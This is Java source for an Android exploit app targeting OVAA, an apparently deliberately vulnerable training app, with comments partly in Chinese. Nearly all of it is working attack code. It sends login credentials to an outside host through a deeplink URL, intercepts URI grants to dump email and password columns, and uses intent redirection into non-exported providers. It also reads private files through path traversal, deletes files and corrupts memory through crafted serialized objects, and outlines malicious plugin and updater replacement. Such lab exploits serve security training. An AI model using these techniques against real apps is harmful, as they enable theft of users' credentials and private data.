package com.example.ovaaexploit;

import androidx.annotation.Nullable;
import androidx.appcompat.app.AppCompatActivity;

import android.accounts.Account;
import android.annotation.SuppressLint;
import android.content.ComponentName;
import android.content.ContentResolver;
import android.content.Context;
import android.content.Intent;
import android.content.IntentFilter;
import android.content.pm.ApplicationInfo;
import android.content.pm.PackageManager;
import android.database.Cursor;
import android.database.DatabaseUtils;
import android.net.Uri;
import android.os.Build;
import android.os.Bundle;
import android.os.Parcel;
import android.os.Parcelable;
import android.os.WorkSource;
import android.util.Log;
import android.view.View;
import android.widget.Button;
import android.widget.Toast;

import java.io.BufferedReader;
import java.io.ByteArrayOutputStream;
import java.io.File;
import java.io.FileInputStream;
import java.io.FileNotFoundException;
import java.io.FileOutputStream;
import java.io.IOException;
import java.io.InputStream;
import java.io.InputStreamReader;
import java.io.ObjectInputStream;
import java.io.ObjectOutputStream;
import java.io.Serializable;
import java.lang.reflect.Constructor;
import java.lang.reflect.Field;
import java.util.ArrayList;

import dalvik.system.DexClassLoader;
import dalvik.system.DexFile;
import oversecured.ovaa.objects.DeleteFilesSerializable;
import oversecured.ovaa.objects.MemoryCorruptionParcelable;

public class MainActivity extends AppCompatActivity {

    @Override
    protected void onCreate(Bundle savedInstanceState) {
        super.onCreate(savedInstanceState);
        setContentView(R.layout.activity_main);

        //1. Leakage of credentials via installation of an arbitrary url.
        //vul function: processDeeplink
        final Button button = findViewById(R.id.button_deeplink);
        button.setOnClickListener(new View.OnClickListener() {
            public void onClick(View v) {
                // Code here executes on main thread after user presses button
                Intent intent = new Intent(Intent.ACTION_VIEW);
                intent.setData(Uri.parse("oversecured://ovaa/login?url=http://10.0.0.75:9090"));
                //intent.setData(Uri.parse("oversecured://ovaa/logout"));
                intent.setClassName("oversecured.ovaa","oversecured.ovaa.activities.DeeplinkActivity");
                Log.d("Debug","[*]open deeplink /oversecured://ovaa/login?url=");
                startActivity(intent);
            }
        });


        //2. Obtaining access to arbitrary non-exported content providers
        //vul function: processDeeplink startActivityForResult
        final Button button1 = findViewById(R.id.button_deeplink_intercept);
        button1.setOnClickListener(new View.OnClickListener() {
            public void onClick(View v) {
                // Code here executes on main thread after user presses button
                Intent intent = new Intent(Intent.ACTION_VIEW);
                intent.setData(Uri.parse("oversecured://ovaa/grant_uri_permissions"));
                intent.setClassName("oversecured.ovaa","oversecured.ovaa.activities.DeeplinkActivity");
                Log.d("Debug","[*]open deeplink oversecured://ovaa/grant_uri_permissions");
                startActivityForResult(intent,101);
            }
        });

        //3. Bypass host validation in deeplink.
        //vul function: processDeeplink
        //vul class: WebViewActivity
        final Button button2 = findViewById(R.id.button_deeplink_webview);
        button2.setOnClickListener(new View.OnClickListener() {
            public void onClick(View v) {
                // Code here executes on main thread after user presses button
                Intent intent = new Intent(Intent.ACTION_VIEW);
                intent.setData(Uri.parse("oversecured://ovaa/webview?url=http://fakeexample.com"));
                intent.setClassName("oversecured.ovaa","oversecured.ovaa.activities.DeeplinkActivity");
                Log.d("Debug","[*]open deeplink oversecured://ovaa/webview");
                startActivity(intent);
            }
        });

        //4. Exfiltrate sensitive data via deeplink by making use of the vulnerable WebView setting
        //        webView.getSettings().setJavaScriptEnabled(true); 允许执行javascript
        //        webView.getSettings().setAllowFileAccessFromFileURLs(true); 允许跨域访问文件
        // load(url) url controlled
        //vul function: processDeeplink
        //vul class: WebViewActivity
        final Button button3 = findViewById(R.id.button_deeplink_webview_loadurl);
        button3.setOnClickListener(new View.OnClickListener() {
            public void onClick(View v) {
                // Code here executes on main thread after user presses button
                Intent intent = new Intent(Intent.ACTION_VIEW);
                intent.setData(Uri.parse("oversecured://ovaa/webview?url=file://example.com/sdcard/Download/payload.html"));
                intent.setClassName("oversecured.ovaa","oversecured.ovaa.activities.DeeplinkActivity");
                Log.d("Debug","[*]open deeplink oversecured://ovaa/webview");
                startActivity(intent);
            }
        });


        //5. Acquiring access to protected activity using intent redirection.
        //vul function: onLoginFinished()
        String INTENT_REDIRECT_KEY = "redirect_intent";
        final Button button4 = findViewById(R.id.button_intent_proxy);
        button4.setOnClickListener(new View.OnClickListener() {
            public void onClick(View v) {
                // Code here executes on main thread after user presses button
                //target to webview
                /*
                Intent intent_target = new Intent("oversecured.ovaa.action.WEBVIEW");
                intent_target.setClassName("oversecured.ovaa","oversecured.ovaa.activities.WebViewActivity");
                intent_target.putExtra("url","http://www.example.com");

                 */

                //target to content provider
                Intent intent_target = new Intent("android.intent.VIEW");
                intent_target.setData(Uri.parse("content://oversecured.ovaa.creds_provider/"));
                intent_target.setClassName("com.example.ovaaexploit","com.example.ovaaexploit.DumpDataActivity");
                intent_target.setFlags(Intent.FLAG_GRANT_READ_URI_PERMISSION);

                Intent intent_proxy = new Intent("oversecured.ovaa.action.LOGIN");
                intent_proxy.setClassName("oversecured.ovaa","oversecured.ovaa.activities.LoginActivity");
                Log.d("Debug","[*]open LoginActivity to start WebViewActivity with export=false");
                intent_proxy.putExtra(INTENT_REDIRECT_KEY,intent_target);
                startActivity(intent_proxy);
            }
        });

        //6. File Theft Via Picker
        //cache folder located at /storage/emulated/0/Android/data/oversecured.ovaa/cache
        //vul function: copyToCache(context,uri) uri controlled via intercept intent
        final Button button5 = findViewById(R.id.button_file_theft_via_picker);
        button5.setOnClickListener(new View.OnClickListener() {
            public void onClick(View v) {
                // Code here executes on main thread after user presses button
                // 创建一个 Toast 对象
                Toast toast = Toast.makeText(getApplicationContext(), "当点击FILE THEFT VIA PICKER按钮后，查看/storage/emulated/0/Android/data/oversecured.ovaa/cache/目录下文件", Toast.LENGTH_SHORT);
                // 显示 Toast 消息
                toast.show();

            }
        });

        //7.Unprotected Broadcast
        final Button button6 = findViewById(R.id.button_unprotected_broadcast);
        button6.setOnClickListener(new View.OnClickListener() {
            public void onClick(View v) {
                Object object = null;
                // //use a reflection method that will load the oversecured APK packages
                //拦截后，payload是LoginData类的序列化数据，需要LoginData类进行反序列化，因此通过reflect方法加载dex
                //将需要的类加载到内存中
                try{
                    PackageManager pm = getPackageManager();
                    ApplicationInfo appinfo = pm.getApplicationInfo("oversecured.ovaa",0);
                    DexFile df = new DexFile(appinfo.sourceDir);
                    ClassLoader cl = getClassLoader();
                    Class cli = df.loadClass("oversecured.ovaa.objects.LoginData",cl);
                    object = cli.newInstance();
                } catch (Exception e){
                    e.printStackTrace();
                }

                // Code here executes on main thread after user presses button
                // 注册 BroadcastReceiver
                IntentFilter filter = new IntentFilter();
                filter.addAction("oversecured.ovaa.action.UNPROTECTED_CREDENTIALS_DATA");
                getApplicationContext().registerReceiver(new InterceptReceiver(), filter);
                // 创建一个 Toast 对象
                Toast toast = Toast.makeText(getApplicationContext(), "当点击UNPROTECTED BROADCAST按钮后，查看LOG文件", Toast.LENGTH_SHORT);
                // 显示 Toast 消息
                toast.show();

            }
        });

        //8.Unprotected Activity Launch
        final Button button7 = findViewById(R.id.button_unprotected_intent);
        button7.setOnClickListener(new View.OnClickListener() {
            public void onClick(View v) {
                // Code here executes on main thread after user presses button
                // 创建一个 Toast 对象
                Toast toast = Toast.makeText(getApplicationContext(), "当点击UNPROTECTED INTENT按钮后，InterceptActivity会接收到存在明文的intent", Toast.LENGTH_SHORT);
                // 显示 Toast 消息
                toast.show();

            }
        });

        //9. Insecure Logger Service
        final Button button8 = findViewById(R.id.button_Insecure_service);
        button8.setOnClickListener(new View.OnClickListener() {
            public void onClick(View v) {
                // Code here executes on main thread after user presses button
                ////target to logger service
                Intent intent = new Intent("oversecured.ovaa.action.DUMP");
                intent.setClassName("oversecured.ovaa","oversecured.ovaa.activities.InsecureLoggerService");
                intent.putExtra("oversecured.ovaa.extra.file","/sdcard/Download/log.txt");//将log写入/sdcard/Download/log.txt中
                startService(intent);
            }
        });

        //10.Hardcoded Credentials
        final Button button9 = findViewById(R.id.button_Hardcoded);
        button9.setOnClickListener(new View.OnClickListener() {
            public void onClick(View v) {
                // Code here executes on main thread after user presses button
                Toast toast = Toast.makeText(getApplicationContext(), "在res/value/strings.xml发现硬编码的信息", Toast.LENGTH_SHORT);
                toast.show();

            }
        });

        //11.Deletion of arbitrary files via the insecure DeleteFilesSerializable deserialization object.
        final Button button10 = findViewById(R.id.button_insecure_DeleteFilesSerializable);
        button10.setOnClickListener(new View.OnClickListener() {
            public void onClick(View v) {
                // Code here executes on main thread after user presses button
                Intent intent_target = new Intent("oversecured.ovaa.action.WEBVIEW");
                intent_target.setClassName("oversecured.ovaa", "oversecured.ovaa.activities.WebViewActivity");
                DeleteFilesSerializable deleteObj = new DeleteFilesSerializable("/data/data/oversecured.ovaa/shared_prefs/login_data.xml");
                //使用intent传递serialize接口对象时，对方接收到后进行反序列化时，其构造函数不会被调用初始化成员变量
                intent_target.putExtra("url", deleteObj);
                //执行putExtra后，会自动调用DeleteFilesSerializable接口的writeObject完成序列化

                Intent intent_proxy = new Intent("oversecured.ovaa.action.LOGIN");
                intent_proxy.setClassName("oversecured.ovaa", "oversecured.ovaa.activities.LoginActivity");
                intent_proxy.putExtra(INTENT_REDIRECT_KEY, intent_target);
                startActivity(intent_proxy);

            }
        });

        //12.Memory corruption via the MemoryCorruptionParcelable object.
        //Insecure use of JSON parsers
        final Button button11 = findViewById(R.id.button_insecure_MemoryCorruptionParcelable);
        button11.setOnClickListener(new View.OnClickListener() {
            public void onClick(View v) {
                // Code here executes on main thread after user presses button
                Intent intent_target = new Intent("oversecured.ovaa.action.WEBVIEW");
                intent_target.setClassName("oversecured.ovaa","oversecured.ovaa.activities.WebViewActivity");
                MemoryCorruptionParcelable memoryCorruptionParcelable = new MemoryCorruptionParcelable("com.android.internal.util.VirtualRefBasePtr", "{'mNativePtr':3735928551}");
                intent_target.putExtra("url",memoryCorruptionParcelable);

                Intent intent_proxy = new Intent("oversecured.ovaa.action.LOGIN");
                intent_proxy.setClassName("oversecured.ovaa","oversecured.ovaa.activities.LoginActivity");
                intent_proxy.putExtra(INTENT_REDIRECT_KEY,intent_target);
                startActivity(intent_proxy);

            }
        });

        //13.Memory corruption via the MemoryCorruptionSerializable object.
        //Using attacker-controlled native pointers
        //攻击步骤
        /*
        Find an exported component that either automatically receives data from the intent (e.g., Intent.getStringExtra(...))
        or checks for the existence of a key (Intent.hasExtra(...)). As a result, all nested objects
        will be automatically deserialized.
        //找到一个导出的组件，其从intent中接收数据，并且使用Intent.hasExtra()或Intent.getStringExtra()检查是否存在某个key
        //此时，objects将会被自动反序列化
        Pass a MemoryCorruptionSerializable object in the intent and specify an arbitrary address for ptr.
        //将MemoryCorruptionSerializable对象放入intent中，并且对ptr赋值为任意地址
        * */
        final Button button12 = findViewById(R.id.button_insecure_MemoryCorruptionSerializable);
        button12.setOnClickListener(new View.OnClickListener() {
            public void onClick(View v) {
                // Code here executes on main thread after user presses button
                Intent intent_target = new Intent("oversecured.ovaa.action.WEBVIEW");
                intent_target.setClassName("oversecured.ovaa","oversecured.ovaa.activities.WebViewActivity");
                //MemoryCorruptionSerializable进行序列化,将类加载到内存中
                try{
                    PackageManager pm = getPackageManager();
                    ApplicationInfo appinfo = pm.getApplicationInfo("oversecured.ovaa",0);
                    DexFile df = new DexFile(appinfo.sourceDir);
                    ClassLoader cl = getClassLoader();
                    Class<?> memoryCorruptionSerializableClass = df.loadClass("oversecured.ovaa.objects.MemoryCorruptionSerializable",cl);
                    Object obj = memoryCorruptionSerializableClass.newInstance();
                    Field ptrField = memoryCorruptionSerializableClass.getDeclaredField("ptr");
                    ptrField.setAccessible(true);

                    // 赋值给ptr变量
                    long nativePtr = 0xffffffff;
                    ptrField.setLong(obj, nativePtr);

                    //将MemoryCorruptionSerializable进行序列化，并且赋值url
                    intent_target.putExtra("url", (Serializable) obj);
                } catch (Exception e){
                    e.printStackTrace();
                }

                Intent intent_proxy = new Intent("oversecured.ovaa.action.LOGIN");
                intent_proxy.setClassName("oversecured.ovaa","oversecured.ovaa.activities.LoginActivity");
                intent_proxy.putExtra(INTENT_REDIRECT_KEY,intent_target);
                startActivity(intent_proxy);
            }
        });

        //14.Obtaining read/write access to arbitrary files in TheftOverwriteProvider via path-traversal in the value uri.getLastPathSegment().
        //uri.getLastPathSegment()截取最后一个"/"后面的数据，存在目录穿越漏洞
        //content://oversecured.ovaa.theftoverwrite/../../../../../data/data/oversecured.ovaa/shared_prefs/login_data.xml
        final Button button13 = findViewById(R.id.button_Insecure_provider);
        button13.setOnClickListener(new View.OnClickListener() {
            public void onClick(View v) {
                // Code here executes on main thread after user presses button
                try {
                    String pathtraversal = "..%2F..%2F..%2F..%2F..%2Fdata%2Fdata%2Foversecured.ovaa%2Fshared_prefs%2Flogin_data.xml";
                    ContentResolver cr = getApplicationContext().getContentResolver();
                    FileInputStream fis = (FileInputStream)cr.openInputStream(Uri.parse("content://oversecured.ovaa.theftoverwrite/"+pathtraversal));
                    BufferedReader r = new BufferedReader(new InputStreamReader(fis));
                    String stealer = "";
                    String mLine;
                    while ((mLine = r.readLine()) != null) {
                        stealer += (mLine + "\n");
                    }
                    Log.d("debug","[*]theft file: " + stealer);
                } catch (Throwable th){
                    throw new RuntimeException(th);
                }
            }
        });


        //15.Use of very wide file sharing declaration for oversecured.ovaa.fileprovider content provider in root entry.
        //attacker can read and write any files belong to App
        //content://oversecured.ovaa.fileprovider/data/data/oversecured.ovaa/shared_prefs/login_data.xml
        //本身未导出，结合intent proxy利用
        //由于fileprovider配置项android:resource="@xml/provider_paths"中provider_paths=root，导致可以访问App下任意文件
        final Button button14 = findViewById(R.id.button_Insecure_fileprovider);
        button14.setOnClickListener(new View.OnClickListener() {
            public void onClick(View v) {
                // Code here executes on main thread after user presses button
                Intent intent_target = new Intent("oversecured.ovaa.action.EVIL");
                intent_target.setData(Uri.parse("content://oversecured.ovaa.fileprovider/root/data/data/oversecured.ovaa/shared_prefs/login_data.xml"));
                intent_target.setFlags(Intent.FLAG_GRANT_READ_URI_PERMISSION);
                intent_target.setClassName("com.example.ovaaexploit","com.example.ovaaexploit.InterceptActivity");

                Intent intent_proxy = new Intent("oversecured.ovaa.action.LOGIN");
                intent_proxy.setClassName("oversecured.ovaa","oversecured.ovaa.activities.LoginActivity");
                Log.d("Debug","[*]open LoginActivity to start fileprovider with export=false");
                intent_proxy.putExtra(INTENT_REDIRECT_KEY,intent_target);
                startActivity(intent_proxy);
            }
        });


        //16.Arbitrary code execution via a DEX library located in a world-readable/writable directory.
        //漏洞存在于invokePlugins（）函数中，App只通过包名中是否包含"oversecured.plugin."以及version信息来判断是否符合要求
        //并通过reflect方式加载oversecured.plugin.Loader类的loadMetadata方法，无其他验证手段
        //攻击者可以创建一个App，使用包名oversecured.plugin.evil,并实现oversecured.plugin.Loader类和loadMetadata方法
        //最终被攻击App会加载第三方恶意App导致信息泄露
        final Button button15 = findViewById(R.id.button_Insecure_dex_loader);
        button15.setOnClickListener(new View.OnClickListener() {
            public void onClick(View v) {
                // Code here executes on main thread after user presses button
                Toast toast = Toast.makeText(getApplicationContext(), "攻击者可以创建一个App，使用包名oversecured.plugin.evil,并实现oversecured.plugin.Loader类和loadMetadata方法的恶意App", Toast.LENGTH_SHORT);
                toast.show();
            }
        });



        //17.Arbitrary Code Execution in OversecuredApplication by launching code from third-party apps with no security checks.
        //public class OversecuredApplication extends Application {
        //updateChecker();
        //File file = new File("/sdcard/updater.apk");
        //升级包直接放在可读写目录，未进行安全校验如md5，签名等，可替换为恶意apk
        final Button button16 = findViewById(R.id.button_Insecure_updater);
        button16.setOnClickListener(new View.OnClickListener() {
            public void onClick(View v) {
                // Code here executes on main thread after user presses button
                Toast toast = Toast.makeText(getApplicationContext(), "updateChecker();中升级包直接放在可读写目录/sdcard/updater.apk，未进行安全校验如md5，签名等，可替换为恶意apk", Toast.LENGTH_SHORT);
                toast.show();
            }
        });
    }

    //intent interception
    //接收setresult()结果
    @Override
    protected void onActivityResult(int requestCode, int resultCode, @Nullable Intent data) {
        super.onActivityResult(requestCode, resultCode, data);
        if (resultCode == -1 && requestCode == 101){
            Log.d("Debug","[*]get intent with grant_read_uri permission.can access the content provider");
            dump(data.getData());
        }
    }
    public void dump(Uri uri){
        Uri myuri;
        myuri = uri;
        String[] cols = new String[] {"email","password"};
        ContentResolver cr = getContentResolver();
        Cursor c = cr.query(myuri,cols,null,null,null);
        Log.d("Debug", DatabaseUtils.dumpCursorToString(c));
    }

}